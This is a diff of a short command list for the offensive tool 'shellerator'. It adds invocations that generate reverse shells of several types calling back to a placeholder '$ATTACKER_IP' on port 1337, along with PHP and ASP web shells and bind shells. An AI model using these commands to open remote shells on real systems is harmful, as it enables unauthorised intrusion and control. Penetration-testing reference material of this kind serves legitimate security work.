@@ -1,2 +1,13 @@
-shellerator
-shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type powershell
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type ncat --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type netcat --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type php --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type python --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type bash --lport 1337
+shellerator --reverse-shell --lhost "$ATTACKER_IP" --type powershell --lport 1337
+shellerator --web-shell --type php
+shellerator --web-shell --type asp
+shellerator --bind-shell --type ncat  --lport 1337
+shellerator --bind-shell --type netcat --lport 1337
+shellerator --bind-shell --type powershell  --lport 1337
+shellerator --bind-shell --type  python --lport 1337
+shellerator --list
